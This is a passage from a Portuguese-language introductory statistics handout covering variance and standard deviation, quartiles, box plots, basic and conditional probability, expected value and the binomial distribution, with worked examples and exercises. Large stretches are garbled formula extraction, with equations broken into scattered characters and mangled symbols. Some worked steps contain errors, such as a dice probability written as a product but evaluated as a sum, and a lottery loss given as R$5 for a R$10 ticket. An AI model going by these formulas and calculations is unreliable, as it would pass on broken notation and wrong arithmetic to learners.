em estatística inferencial e na análise de amostras. (amostra ® s2, população  ® s2). 
 
 
Expressões:    
  ou    
 
 
Onde:  
 
 
 
1.6.3- DESVIO-PADRÃO ( “ s ” ou “ s ” ). 
(
)
n
x
x
s
ou
i
2
2
2
-
S
=
s
(
)
1
2
2
2
-
-
S
=
n
x
x
s
ou
i
s
(
)
2
2
3
2
2
2
1
2
)
(
.....
)
(
)
(
)
(
x
x
x
x
x
x
x
x
x
x
n
i
-
+
+
-
+
-
+
-
=
-
S

 
 
O DESVIO-PADRÃO é dado pela raiz quadrada da variância (amostras: 
 ou, 
população: 
), tendo então a mesma unidade dos dados analisados. 
 
Ex.01: Rol:  21, 32, 64, 148.  Média: 
 
 
Cálculo da Variância (pela definição): 
 
 
 
Desvio-Padrão:   
 
 
 
Ex.02: Amostra:  2, 2, 2, 2, 6, 6, 8, 8, 8, 9. 
 
Média: 
 
Variância: 
 
 
 
 
 
Ou podemos simplificar e multiplicar pela frequência: 
 
 
2s
s =
2
s
s =
25
,
66
4
265
4
148
64
32
21
=
=
+
+
+
=
x
(
)
)1
4
(
)
25
,
66
148
(
)
25
,
66
64
(
)
25
,
66
32
(
)
25
,
66
21
(
1
2
2
2
2
2
2
-
-
+
-
+
-
+
-
=
-
-
S
=
n
x
x
s
i
3
0625
,
6683
0625
,5
0625
,
1173
5625
,
2047
3
)
75
,
81
(
)
25
,2
(
)
25
,
34
(
)
25
,
45
(
2
2
2
2
2
+
+
+
=
+
-
+
-
+
-
=
s
9167
,
3302
916667
,
3302
3
75
,
9908
2
2
=
®
@
=
s
s
47
,
57
...
47100719
,
57
916667
,
3302
2
@
®
=
=
=
s
s
s
3,5
10
53
10
9
8
8
8
6
6
2
2
2
2
=
=
+
+
+
+
+
+
+
+
+
=
x
(
)
(
)
(
)
2
2
2
2
1
1
1
1
1
1
x
x
n
x
x
n
n
x
x
s
i
i
i
-
S
-
=
-
S
-
=
-
-
S
=
[
2
2
2
2
2
)3,5
2
(
)3,5
2
(
)3,5
2
(
)3,5
2
(
1
10
1
-
+
-
+
-
+
-
-
=
s
+
-
+
-
2
2
)3,5
6
(
)3,5
6
(
]
2
2
2
2
)3,5
9
(
)3,5
8
(
)3,5
8
(
)3,5
8
(
-
+
-
+
-
+
-
[
] [
] [
] [
]
{
}
2
2
2
2
2
)3,5
9
.(
1
)3,5
8
.(
3
)3,5
6
.(
2
)3,5
2
.(
4
9
1
-
+
-
+
-
+
-
=
s
(
)
(
)
2
2
2
1
1
1
1
x
x
f
n
x
x
f
n
s
i
i
i
i
-
S
-
=
úû
ù
êë
é
-
S
-
=
OBS.: Distribuições de 
frequências. 
X 
f 
2 
4 
6 
2 
8 
3 
9 
1 
S 
10 
 

 
 
 
 
Desvio-Padrão: 
 
 
OBS.: Como pode ser visto neste exemplo, no caso da possibilidade de utilização das 
frequências, os quadrados dos desvios deverão ser multiplicados pelas respectivas 
frequências absolutas (simples) dos termos. 
 
Ex.03: 
Produtos vendidos no dia 
k 
Intervalo 
f 
Pm (x) 
Pm.f 
Pm –
 
(Pm –
)2 
f.(Pm –
)2 
1 
19 – 23 
25 
21 
525 
–2,5 
6,25 
156,25 
2 
23 – 27 
5 
25 
125 
1,5 
2,25 
11,25 
3 
27 – 31 
10 
29 
290 
5,5 
30,25 
302,50 
S 
 
40 
 
940 
 
 
470,00 
 n = 40        
= S(Pm.f)/n = 940/40 = 23,5 produtos. 
 
 
 produtos. 
 
OBS: Pm é o ponto médio do intervalo 
 
1.6.3 Quantis Empíricos 
 
A mediana separa os dados em dois grupos: 50% são maiores ou iguais e 50% menores. 
Os quantis são medidas que separam os dados em mais grupos e nos dão uma 
perspectiva maior a respeito da dispersão dos deles. A mediana é um quantil, divide em 
dois grupos.  
Os quartis dividem os dados em 4 partes, sendo assim 25% dos dados estão abaixo do 
𝑞&, 50% dos dados abaixo do 𝑞', e assim por diante. 
(
)
9,8
9
1,
80
69
,
13
87
,
21
98
,0
56
,
43
9
1
2
=
=
+
+
+
=
s
983
,2
...
983286
,2
9,8
2
@
=
=
=
s
s
x
x
x
n
f
x
x
/
.
S
=
0513
,
12
05128205
,
12
39
00
,
470
1
)
.(
1
)
.(
2
2
2
@
=
=
-
-
S
=
-
-
S
=
n
x
Pm
f
n
x
x
f
s
i
i
i
i
4715
,3
...
47149
,3
0513
,
12
2
@
@=
=
=
s
s

 
 
Os decis separam em dez grupos e os percentis em cem 
Se o conjunto for pequeno os mais indicados são a mediana e o quartil 
O cálculo dos quantis é semelhante ao da mediana, divide o gruo todo nas partes 
indicadas: mediana dois grupos, quartis quatro grupos, decis dez. caso a divisão não 
seja exata fazemos a média dos dados extremos. 
Ex: Considere o seguinte conjunto de dados: 3,5,6,7,10,15, 15, 19,21. Os dados já estão 
ordenados, a mediana é o elemento do meio, ou seja 10. Se quisermos considerar o 
quartil 𝑞&, temos que dividir os dados em quatro grupos e considerar o extremo do 
primeiro grupo, como são 9 elementos o 𝑞& =
()*
' = 5,5. Já o 𝑞+ =
&()&,
'
= 17 
Temos assim que 25% dos valores são menores que 5,5, 50% dos valores são menores 
que 10 e 75% dos valores menores que 17.  
 
1.6.4 Box Plot 
 
O Box Plot é um tipo de gráfico utilizado para representar a dispersão dos dados, 
utilizando os quartis e os limites inferior e superior como referência. Valores muito 
discrepantes são representados por asteriscos. 
Além 
disso, 
o 
Box 
Plot 
pode 
informar 
a posição dos 
dados, 
sua simetria, dispersão, cumprimento da cauda de distribuição e se estão ou 
não distorcidos. Observe o gráfico abaixo: 
 
 
 
 
 

 
 
 
 
No gráfico do Box Plot, a haste vertical é interpretada de baixo para cima, sendo que a 
parte inferior indica o mínimo e a superior indica o máximo, sempre desconsiderando 
possíveis outliers. 
O retângulo central da haste possui três linhas que estão na horizontal: a linha de baixo, 
representada pelo contorno externo inferior do retângulo, indica o primeiro quartil. 
A linha de cima, que é o contorno externo superior do retângulo, indica o terceiro 
quartil. Já a linha interna indica a mediana ou o chamado segundo quartil. 
Valores discrepantes, outliers e extremos são representados por asteriscos ou 
pontos, e indicam pontos atípicos no gráfico. 
 
O Box Plot é usado também para comparar resultados de várias amostrar de um mesmo 
experimento simultaneamente. Observe: 

 
 
 
 
Ex: Para analisar a discrepância entre as idades 25, 32, 40, 18, 55, 22, 30, 37, 19, 41, 
28, 50, 65, 23, 35, 42, 20, 48, 27, 33, usamos o Box plot 
 
 
 
Percebemos que os dados estão concentrados entre 23 e 42 anos. 
 
 
 
 
 
Idade
0
10
20
30
40
50
60
70
Faixa Etária

 
 
EXERCÍCIOS 
1. Analise os dados abaixo e classifique as variáveis.  
População 
Variável 
Classificação 
Alunos de uma escola 
Cor dos cabelos 
 
Casais residentes numa cidade 
Número de filhos 
 
Funcionários de uma empresa 
Grau de instrução 
 
Jogadas de um dado 
A face obtida 
 
Peças produzidas por Indústria 
Produção mensal 
 
Peças produzidas por Máquina 
Diâmetro interno 
 
Alunos de uma cidade 
Cor dos olhos 
 
Estação meteorológica 
Precipitação anual 
 
Funcionários de uma empresa 
Salários 
 
Pregos produzidos por 1 máquina Comprimento 
 
Casais de uma cidade 
Sexo dos filhos 
 
Propriedades agrícolas do Sul 
Produção de algodão 
 
Bibliotecas de São Paulo 
Quantidade de volumes 
 
Militares de um batalhão 
Patentes 
 
Consumidores de energia elétrica Classes de consumo 
 
Aparelhos produzidos 
Defeitos por lote 
 
Pessoas doentes 
Estágio da doença 
 
Segmento de retas 
comprimentos 
 
 
2. Considere os dados escritos na tabela abaixo determine a média, a mediana, o 
primeiro e o terceiro quartil e o desvio padrão dos dados. 
Quantidade de filhos por casal 
N° de filhos 
N° de casais 
0 
3 
1 
5 
2 
25 
3 
12 
4 
5 
Total 
50 
 
 
 
 
 
 

 
 
UNIDADE 2– PROBABILIDADE 
 
Nessa Unidade vamos rever conceitos e cálculos básicos de probabilidade e avançar 
um pouco mais com relação a probabilidade condicional, propriedades da probabilidade, 
probabilidade por frequência que é muito utilizada nas pesquisas com amostras de 
dados.  
 
2.1- INTRODUÇÃO 
 
A probabilidade está ligada à chance de determinado acontecimento, o qual não pode 
ser previsto com certeza em função variações produzidas pelo acaso. P.ex.: 
- Ter sucesso numa cirurgia; 
- Fazer sol na próxima 2ª-feira; 
- Ações adquiridas se valorizarem na bolsa de valores no próximo mês; 
- Selecionar um produto defeituoso num lote de produtos destinados à vendas; 
- Superar uma meta mensal de vendas; 
- Jogar um dado e obter a face “3”; 
- Gastar menos de 10 minutos numa fila de banco; 
- Ganhar um prêmio num sorteio; 
A probabilidade é a base da Estatística Inferencial. 
 
PRINCIPAIS DEFINIÇÕES: 
-Experimento ou Experimento Aleatório ou Experimento Probabilístico:  é uma ação ou 
ensaio por meio do qual são obtidos resultados específicos. 
-Resultado: desencadeamento de um único experimento probabilístico. 
-Espaço amostral (W): é o conjunto de todos os resultados probabilísticos possíveis para 
um experimento, podendo ser finito ou infinito. 
-Evento: um ou mais resultados do espaço amostral (geralmente designado por uma 
letra maiúscula). 
 
EX.01: No lançamento de um dado temos 
W: Lançamento de um dado ® W={1, 2, 3, 4, 5, 6} 

 
 
Podemos ter os seguintes Eventos 
A: Obtenção de uma face par ® A={2, 4, 6} 
B: Obtenção de uma face ímpar ® B={1, 3, 5} 
C: Obtenção de uma face maior que 4 ® C={5, 6} 
D: Obtenção de uma face maior que 9 ® D=Æ 
 
EX.07: Ao lançar uma moeda e um dado e observar suas fazes 
W: Lançamento de uma moeda e um dado 
W={(Ca,1), (Ca,2), (Ca,3), (Ca,4), (Ca,5), (Ca,6), (Co,1), (Co,2), (Co,3), (Co,4), (Co,5), 
(Co,6)}.  
Um evento seria  
A: Dado inferior a 3 ® A={(Ca,1), (Ca,2), (Co,1), (Co,2)} 
 
 
2.2- TIPOS DE PROBABILIDADES  
 
Para um determinado Espaço Amostral W e um Evento E (que tem frequência fE, a 
probabilidade do evento E é designada por P(E) 
PROBABILIDADE CLÁSSICA OU TEÓRICA (Pc): Cada resultado tem a mesma chance 
de ocorrer. É definida como sendo o número de resultados de um evento, sobre o 
número de resultados possíveis (espaço amostral), assim: 𝑝(𝐸) =
"(.)
"(Ω) 
. 
Ex.: Um dado é lançado e pretende-se determinar:  
1) A probabilidade de sair um 4;  
2) A probabilidade de sair um número de face menor que 3; 
Solução:  
W = {1, 2, 3, 4, 5, 6}; 
1) E={4} ® P(4)=1/6; 
2) E={1,2} ® P(x<3) = P(1)+P(2)=(1/6)+(1/6) = 2/6 = 1/3. 
 

 
 
PROBABILIDADE EMPÍRICA OU ESTATÍSTICA (PE): Baseia-se em observações de 
experimentos probabilísticos. É numericamente igual a frequência relativa deste evento. 
Assim: 
. 
Ex.: Uma cidade possui 3 tipos de veículos: carros, motos e bicicletas. Faz-se uma 
coleta aleatória de 50 veículos, quando são quantificadas: 30 bicicletas, 15 motos e 5 
carros. A partir disso, define-se a probabilidade de ser obter cada tipo de veículo por:  
P(c)=5/50=10%;  
P(m)=15/50=30% e  
P(b)=30/50=60%. 
 
Obs: Não é conhecido a percentagem real de cada veículo na cidade, logo admite-se 
que ela é igual àquela obtida na amostra (frequência relativa). 
 
Ex 1: Observe a tabela abaixo que fala sobre o QI de crianças expostas a baixa 
quantidade de chumbo.  
Analisando a distribuição de frequência, qual a probabilidade de na amostra pesquisada, 
uma criança tenha QI ente 90 e 109? 
 
 
𝑝= 35
78 = 0,4487 = 44,87% 
 
 
2.3- PROPRIEDADES DA PROBABILIDADE 
n
f
f
f
E
P
E
E
E
=
= å
)
(

 
 
 
• 
𝑝(𝛺) = 1   
• 
0 < 𝑝(𝐸) < 1 para qualquer evento do espaço amostral. 
• 
𝑝(𝐴⋃𝐵) = 𝑝(𝐴) + 𝑝(𝐵) −𝑝(𝐴⋂𝐵) 
• 
Eventos são mutuamente excludentes se a existência de um excluir a existência 
do outro.  
 
• 
Caso os eventos A e B sejam mutuamente excludentes a interseção deles é vazia 
logo 
• 
𝑝(𝐴⋃𝐵) = 𝑝(𝐴) + 𝑝(𝐵) 
• 
Um evento EC é complementar de E, quando ele representa as demais 
possibilidades do espaço amostral, um complementa o outro. Sendo assim: 
𝑝(𝐸𝐶) = 1 −𝑝(𝐸) 𝑜𝑢 𝑝(𝐸𝐶) + 𝑝(𝐸) = 1 
 
 
Ex.: Considere o espaço amostral de sortear um número de 1 a 5. Temos W = {1, 2, 3, 
4, 5}. Considere o evento o número sorteado ser menor que 4, daí  E = {1, 2, 3} 
 
P(E)  = P(1)+P(2)+ P(3)= (1/5)+ (1/5)+ (1/5) = 3/5 = 0,6 = 60%. 
 
Neste caso não é necessário usar propriedade, bastava usar a própria definição  
𝑝(𝐸) = 𝑛(𝐸)
𝑛(Ω) = 3
5 
O complementar de E no caso é ser maior ou igual a 4 , sua probabilidade é dada por 
𝑝(𝐸′) = 1 −𝑝(𝐸) = 1 −3
5 = 2
5 = 40% 
 
Ex 4: Observe a tabela referente a dados de alunos de uma Universidade.  
B
A
A
B
A e B
A e B ® Mutuamente 
Exclusivos
A e B ®  Nao Mutuamente 
Exclusivos

 
 
 
Qual a probabilidade de: 
a) 
Ser mulher e cursar Matemática Aplicada? 
 
𝑝= 15
200 = 0,075 = 7,5% 
 
b) 
Ser mulher ou cursar matemática Aplicada? 
 
𝑝= 85
200 + 30
200 −15
200 = 0,5 = 50% 
 
Nesse caso vimos que foi necessário aplicar a propriedade pois os eventos tem 
interseção.  
 
 
2.4- PROBABILIDADE CONDICIONAL, INDEPENDÊNCIA DE EVENTOS  
 
Probabilidade Condicional é a probabilidade de ocorrer um evento após a ocorrência de 
um outro evento. Pode ser designada por P(B/A), que se lê: “Probabilidade de ocorrer 
B, ocorrido A”. Para se obter a probabilidade de um evento condicionado a outro ocorrer 
usamos a fórmula: 
• 
𝑝(𝐴𝐵
⁄ ) =
0(1⋂3)
0(3)    ou 𝑝(𝐴⋂𝐵) = 𝑝(𝐴𝐵
⁄ )𝑝(𝐵) 
 
Ex: Na tabela dada anteriormente vamos verificar dois casos probabilidade 
condicionada onde não necessitamos da fórmula, apenas analisar a tabela. Vamos 
determinar a probabilidade em cada caso: 

 
 
 
a) 
Ser homem, sabendo que é do curso de Matemática Aplicada 
𝑝= 15
30 = 50%  
b) 
Ser mulher, sabendo que é do curso de estatística 
𝑝= 20
30 = 66,7%  
 
 
Ex: Num baralho comum de 52 cartas, a probabilidade de tirar uma carta de naipe 
espada (evento A)  é 𝑝(𝐴) =
&+
('   e a probabilidade de retirar uma carta preta é 𝑝(𝐴) =
'*
(', temos dois naipes pretos . Qual a probabilidade de que a carta retirada seja de 
espadas, dado que é preta? 
Temos uma probabilidade condicional. Nesse caso seu cálculo é: 
𝑝(𝐴𝐵
⁄ ) = 𝑝(𝐴⋂𝐵)
𝑝(𝐵)
  =
13
52
26
52
= 0,5 = 50%  
 
OBS: 𝑝(𝐴⋂𝐵) = 𝑝(𝐴)  pois a carta de espadas é preta. 
 
INDEPENDÊNCIA DE EVENTOS: Dois eventos são independentes se a ocorrência de 
um não afeta a probabilidade de ocorrência do outro, doutra forma os eventos serão 
dependentes. Se A e B são independentes então 𝑝(𝐴⋂𝐵) = 𝑝(𝐴)𝑝(𝐵),  
 
Ex.1: Lançamento de uma moeda com obtenção da face coroa (A) e, na sequência, 
lançamento de um dado obtendo um 2 (B).  
Solução:  
P(B)=1/6 e P(B/A)=1/6 ® Como P(B)= P(B/A) os eventos são independentes. 
 
Ex.2: Numa urna contendo 4 bolas marrons e 6 bolas vermelhas, retira-se uma bola 
marron (B) e, sem reposição, retira-se uma bola vermelha (A).  
Solução: 
Retirada de 1 bola vermelha: P(A)=6/10 

 
 
Retirada de 1 bola vermelha após a retirada sem reposição de uma bola marron: 
P(A/B)=6/9 
Como P(A)¹P(A/B) os eventos são dependentes. 
 
Ex. A probabilidade de um evento A ocorrer é de 24% e de B é de 35%. Sabendo que 
os eventos são independentes, qual a probabilidade de 𝑝(𝐴⋂𝐵)? 
 
𝑝(𝐴⋂𝐵) = 0,24.0,35 = 0,084 = 8,4% 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
EXERCÍCIOS 
 
1) Uma amostra de 300 insetos coletados numa fazenda mostrou que 30 estavam 
contaminados com uma bactéria A, 70 estavam contaminados com uma bactéria B e o 
restante ainda não estavam contaminados. Determine:  
a) A probabilidade de um inseto estar contaminado com a bactéria A;  
b) A probabilidade de um inseto estar contaminado com a bactéria B;  
c) A probabilidade de um inseto estar contaminado;  
d) A probabilidade de um inseto não estar contaminado;  
e) A probabilidade de um inseto não estar contaminado com a bactéria A;  
f) A probabilidade de um inseto não estar contaminado com a bactéria B; 
 
2) Uma cidade tem 50000 habitantes e 3 jornais: A, B e C. Sabendo-se que: 15000 leem 
o jornal A, 10000 leem o jornal B, 8000 leem o jornal C, 6000 leem os jornais A e B, 
4000 leem os jornais A e C, 3000 leem os jornais B e C, e 1000 leem os 3 jornais. 
Selecionando-se uma pessoa ao acaso pergunta-se:  
a) Qual a probabilidade dela ler ao menos um jornal?  
b) Qual a probabilidade dela ler somente um jornal? 
 
 
3) Um levantamento num departamento de um 
órgão revelou o quadro ao lado. Se for escolhido 
um 
funcionário 
aleatoriamente 
para 
uma 
entrevista, pergunta-se qual a probabilidade:  
a) de ser homem e ser formado em engenharia;  
b) de ser mulher e ser formada em direito;  
c) de ser homem dado que é engenheiro,  
d) de ser engenheiro dado que é homem;  
e) de ser mulher dado que é formada em direito;   
f) de ser formado em direito ou ser mulher. 
 
 
 
Homens 
Mulheres 
Total 
Engenharia 
22 
18 
40 
Direito 
15 
20 
35 
Total 
37 
38 
75 
 

 
 
04) Numa fábrica existem 3 lotes de peça, cada um contendo 11% de peças defeituosas. 
Numa inspeção de qualidade, retirando-se apenas 1 peça de cada lote, qual a 
probabilidade de não se encontrar nenhuma peça defeituosa? 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 3 – Variáveis Aleatórias e Distribuições de Probabilidades 
 
 
Nessa unidade o conceito de variável aleatória e suas distribuições será apresentado 
de forma que seja possível relacionar com situações do dia a dia e com conteúdo das 
próximas unidades. 
 
3.1 
VARIÁVEL ALEATÓRIA DISCRETA 
 
Consideramos como variáveis os componentes do Espaço Amostral. Essas variáveis 
podem ser Qualitativas ou Quantitativas. Porém as técnicas para análise das varáveis 
quantitativas são mais avançadas e ricas.  
Podemos utilizar recursos para transformar variáveis Qualitativas em Variáveis 
Quantitativas para realização de algumas análises e inferências que são usadas apenas 
nas quantitativas. 
 
Ex : Em uma pesquisa onde as opções de respostas são Sim ou Não, podemos designar 
0 para Sim e 1 para não, transformando a variável qualitativa em quantitativa.  
 
As variáveis que utilizamos para gerar modelos probabilísticos são chamadas de 
Variáveis Aleatórias e podem ser discretas ou contínuas. Uma variável aleatória é 
discreta quando seus valores estão definidos em um conjunto e numerável e são 
contínuas quando seus valores estão definidos em intervalos numéricos.  
Uma variável aleatória discreta é uma função 𝑋 definida no espaço amostral Ω, com 
valores num conjunto enumerável.  Associamos a cada valor 𝑥# da variável uma 
probabilidade correspondente. A função de probabilidade é a função que associa para 
cada valor 𝑥# em 𝑋 a probabilidade da sua ocorrência.  
 
Ex : No lançamento de uma moeda vamos considerar que a variável aleatória X é o 
número de caras. Observe o quadro abaixo: 

 
 
 
Ex: Em uma pesquisa de satisfação com um produto tivemos 30% acham ruim, 45% 
consideram razoável e 25% consideram com. Se considerarmos 0 para ruim, 1 para 
razoável e 2 para bom ao selecionar uma pessoa ao acaso teremos:  
 
Pontuação 
(x) 
p(x) 
0 
0,3 
1 
0,45 
2 
0,25 
 
3.2- DISTRIBUIÇÕES DE PROBABILIDADES 
 
As distribuições de probabilidades são associações ordenadas entre os valores das 
variáveis aleatórias e as respectivas probabilidades. As distribuições têm as seguintes 
propriedades: 0 ≤ P(x) ≤ 1  e  åP(x) = 1.  
 
Ex.1: 
x 
10 
12 
17 
19 
30 
P(x) 
0,2237 0,0018 0,4782 0,5556 0,1111 
Não é dist. de probabilidade ® SP(x)= 0,2237+0,0018+0,4782+0,5556+0,1111 =1,3704 
>>>1 
 
Ex.2: 
y 
3 
4 
7 
9 
10 
11 
P(y) 
0,21 
0,19 
0,08 
0,13 
0,16 
0,23 
É dist. de probabilidade ® SP(y)=0,21+0,19+0,08+0,13+0,16+0,23=1 e 0≤P(y)≤1 / "y  

 
 
 
Ex.3: 
z 
8 
10 
12 
14 
P(y) 
0,25 
1,02 
0,11 
0,07 
Não é distribuição de probabilidade ® P(10)=1,02>1  
 
 
Ex.: 
 
 
 
 
 
 
 
 
 
OBS.: 
 
 
 
 
 
 
 
 
 
 
5,
15
20
310
20
3.
25
5.
20
7.
15
1.
10
4.5
=
=
+
+
+
+
=
å
=
å
å
=
n
xf
f
xf
x
20
)
5,
15
25
(3
)
5,
15
20
(
5
)
5,
15
15
(
7
)
5,
15
10
(1
)
5,
15
5
(
4
)
(
2
2
2
2
2
2
2
-
+
-
+
-
+
-
+
-
==
å
å
-
=
f
x
f
µ
s
20
)
5,
15
25
(3
20
)
5,
15
20
(
5
20
)
5,
15
15
(
7
20
)
5,
15
10
(1
20
)
5,
15
5
(
4
2
2
2
2
2
-
+
-
+
-
+
-
+
-
=
25
,
42
)
5,
15
25
(
20
3
)
5,
15
20
(
20
5
)
5,
15
15
(
20
7
)
5,
15
10
(
20
1
)
5,
15
5
(
20
4
2
2
2
2
2
=
-
+
-
+
-
+
-
+
-
=
å
-
=
-
+
-
+
-
+
-
+
-
=
2
2
5
5
2
4
4
2
3
3
2
2
2
2
1
1
)
(
)
(
)
(
)
(
)
(
)
(
µ
µ
µ
µ
µ
µ
i
i x
fr
x
fr
x
fr
x
fr
x
fr
x
fr
5,6
25
,
42
2
=
=
=
s
s
5,
15
)
(
)
(
)
(
=
å
=
å
=
x
xfr
x
xP
x
E
x 
f 
fr  = P 
x.fr = x.P 
(x-µ)2.fr = (x-µ)2.P 
5 
4 
0,20 
1,00 
22,0500 
10 
1 
0,05 
0,50 
1,5125 
15 
7 
0,35 
5,25 
0,0875 
20 
5 
0,25 
5,00 
5,0625 
25 
3 
0,15 
3,75 
13,5375 
S 
20 
1,00 
15,5 
42,25 
 

 
 
Ex. (Valor Esperado): Em uma loteria, 2000 bilhetes são vendidos a R$10,00 para 
prêmios nos valores de R$5000,00, R$4000,00, R$3000,00, R$2000,00, R$1000,00 e 
R$500,00. Qual o valor esperado para alguém que comprar um bilhete? 
R.: 
Ganho no prêmio 1 (R$5000,00): 5000-10=4990 ® Probabilidade: P(1)=1/2000 
Ganho no prêmio 2 (R$4000,00): 4000-10=3990 ® Probabilidade: P(1)=1/2000 
Ganho no prêmio 3 (R$3000,00): 3000-10=2990 ® Probabilidade: P(1)=1/2000 
Ganho no prêmio 4 (R$2000,00): 2000-10=1990 ® Probabilidade: P(1)=1/2000 
Ganho no prêmio 5 (R$1000,00): 1000-10=0990 ® Probabilidade: P(1)=1/2000 
Ganho no prêmio 6 (R$0500,00): 0500-10=0490 ® Probabilidade: P(1)=1/2000 
Perda (R$5,00) ® Probabilidade: P(1)=(2000-6)/2000=1994/2000 
 
 
 (Espera-se uma perda média de R$2,25 por cada bilhete comprado) 
 
 
Ex. Qual o número médio de caras quando lançamos uma moeda não viciada três 
vezes? 
R.:  
W={(Ca,Ca,Ca), (Ca,Ca,Co), (Ca,Co,Ca), (Ca,Co,Co), (Co,Ca,Ca), (Co,Ca,Co), 
(Co,Co,Ca), (Co,Co,Co)} 
X = Número de Caras;    P(X=0)=1/8;   P(X=1)=3/8;   P(X=2)=3/8;   P(X=3)=1/8;    
 
 
Ex. (Valor Esperado): Qual o valor esperado para o lançamento de um dado? 
R.:  
W={1, 2, 3, 4, 5, 6}   e    P(1)=P(2)=P(3)=P(4)=P(5)=P(6)=1/6 
 
 
=
=
)
(
.
x
P
x
E
2000
1994
10
2000
1
.
490
2000
1
.
990
2000
1
.
1990
2000
1
.
2990
2000
1
.
3990
2000
1
.
4990
-
+
+
+
+
+
=
25
,2
-
=
5,1
8
1
.3
8
3
.2
8
3
.1
8
1
.0
)
(
.
=
+
+
+
=
=
x
P
x
E
5,3
6
1
.6
6
1
.5
6
1
.4
6
1
.3
6
1
.2
6
1
.1
)
(
.
=
+
+
+
+
+
=
=
x
P
x
E

 
 
3.3- DISTRIBUIÇÃO BINOMIAL 
 
EXPERIMENTOS BINOMIAIS: São experimentos onde cada tentativa pode resultar em 
apenas dois tipos de resultado: favorável a uma proposição (sucesso) e desfavorável a 
uma proposição (fracasso). Ex.: Um atirador que mira um alvo tem apenas duas 
possibilidades: acertar ou errar. 
 
REQUISITO DOS EXPERIMENTOS BINOMIAIS: Todo experimento binomial precisa 
preencher os seguintes requisitos: a) ser repetido por um número fixo de vezes onde 
cada repetição é independente; b) ter somente dois resultados possíveis; c) ter a mesma 
probabilidade de sucesso em cada tentativa; e, d) ter a variável aleatória contando o 
número de tentativas de sucesso. 
FÓRMULA DA PROBABILIDADE BINOMIAL: 
.   Sendo: n ® número de repetições;   p ® probabilidade 
de sucesso de uma tentativa;   q ® probabilidade de fracasso de uma tentativa (q=1-p);   
x (= 1, 2, 3, ....n) ® variável aleatória que representa o número de sucessos. 
 
MÉDIA, VARIÂNCIA E DESVIO-PADRÃO DA DISTRIBUIÇÃO BINOMIAL: 
Valor Esperado (Média): 
;   Variância: 
 
 
 
Ex.1: Um dado é lançado 3 vezes. Obtenha a probabilidade de sair apenas uma face 5. 
n=3;   p=1/6;   q=5/6;   x=1   ® É um experimento binomial (sucesso = 1 face 5). 
 
x
n
x
x
n
x
x
n
q
p
x
x
n
n
q
p
C
x
P
-
-
-
=
=
!
)!
(
!
)
(
,
np
x
E
=
= µ
)
(
npq
=
2
s

 
 
 
 
P(1) = (25/216).(25/216).(25/216) = 3.25/216 @ 0,3472. (Probabilidade de apenas 1 
sucesso) 
OBS.: n=3, x=1, p=1/6 e q=5/6 
 
 ®  
 
 
Ex.2: Uma sondagem revela a intenção de voto dos eleitores para 6 candidatos, como 
mostra a tabela lateral. Sabendo que 5 candidatos foram 
entrevistados, monte a distribuição de probabilidade para aqueles que 
votariam no candidato D. (OBS.: n=5; x=0,5; p=0,11; q=1-0,11=0,89). 
 
1/6
5/6
1/6
1/6
1/6
1/6
1/6
1/6
5/6
5/6
5/6
5/6
5/6
5/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
P(5,5,5) =  (1/6).(1/6).(1/6) = 1/216
P(5,5,-) =  (1/6).(1/6).(5/6) = 5/216
P(5,-,5) =  (1/6).(5/6).(1/6) = 5/216
P(5,-,-) =  (1/6).(5/6).(5/6) = 25/216
P(-,5,5) =  (5/6).(1/6).(1/6) = 5/216
P(-,5,-) =  (5/6).(1/6).(5/6) = 25/216
P(-,-,5) =  (5/6).(5/6).(1/6) = 25/216
P(-,-,-) =  (5/6).(5/6).(5/6) = 125/216
3
X
2
2
1
2
1
1
0
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
3472
,0
72
25
36
25
6
1
.3
6
5
6
1
!1
)!
1
3
(
!3
)1(
1
3
1
@
=
÷
ø
ö
ç
è
æ÷
ø
ö
ç
è
æ
=
÷
ø
ö
ç
è
æ
÷
ø
ö
ç
è
æ
-
=
-
P
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
Candidato 
Intenção 
A 
32 % 
B 
30 % 
C 
22 % 
D 
11 % 
E 
4 % 
F 
1 % 
 

 
 
 
 
 
 
 
 
Ex.3: Uma inspeção indica que 39% das residências de uma cidade estão infectadas 
com o mosquito transmissor da dengue. Selecionando-se 6 casas ao acaso, obtenha: 
a) a distribuição de probabilidades e o respectivo gráfico; b) a probabilidade de 
exatamente 4 casas estares infectadas; c) a probabilidade de ao menos 3 casas estarem 
infectadas; d) a probabilidade de até 2 casas estarem infectadas; e) a probabilidade de 
menos que 3 casas estarem infectadas; f) o valor esperado de casas infectadas; g) a 
variância de casas infectadas; e, h) o desvio-padrão de casas infectadas. (OBS.: n=6; 
x=0..6; p=0,39; q=1-0,39=0,61; 
); 
a) 
 
 
 
 
 
 
 
 
 
 
 
 
 
558406
,0
558406
,0.1.1
89
,0.
11
,0
]}.
!0
)!.
0
5
/[(
!5
{
)
0
(
0
5
0
@
@
-
=
-
P
345082
,0
627422
,0.
11
,0.5
89
,0.
11
,0
]}.
!1
)!.
1
5
/[(
!5
{
)1(
1
5
1
@
@
-
=
-
P
085301
,0
704969
,0.
0121
,0.
10
89
,0.
11
,0
]}.
!2
)!.
2
5
/[(
!5
{
)
2
(
2
5
2
@
@
-
=
-
P
010543
,0
792100
,0.
001331
,0.
10
89
,0.
11
,0
]}.
!3
)!.
3
5
/[(
!5
{
)3
(
3
5
3
@
@
-
=
-
P
000652
,0
89
,0.
000146
,0.5
89
,0.
11
,0
]}.
!4
)!.
4
5
/[(
!5
{
)
4
(
4
5
4
@
@
-
=
-
P
000016
,0
1.
000016
,0.1
89
,0.
11
,0
]}.
!5
)!.
5
5
/[(
!5
{
)
5
(
5
5
5
@
@
-
=
-
P
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
051520
,0
051520
,0.1.1
61
,0.
39
,0
]}.
!0
)!.
0
6
/[(
!6
{
)
0
(
0
6
0
@
@
-
=
-
P
197636
,0
084460
,0.
39
,0.6
61
,0.
39
,0
]}.
!1
)!.
1
6
/[(
!6
{
)1(
1
6
1
@
@
-
=
-
P
315893
,0
138458
,0.
1521
,0.
15
61
,0.
39
,0
]}.
!2
)!.
2
6
/[(
!6
{
)
2
(
2
6
2
@
@
-
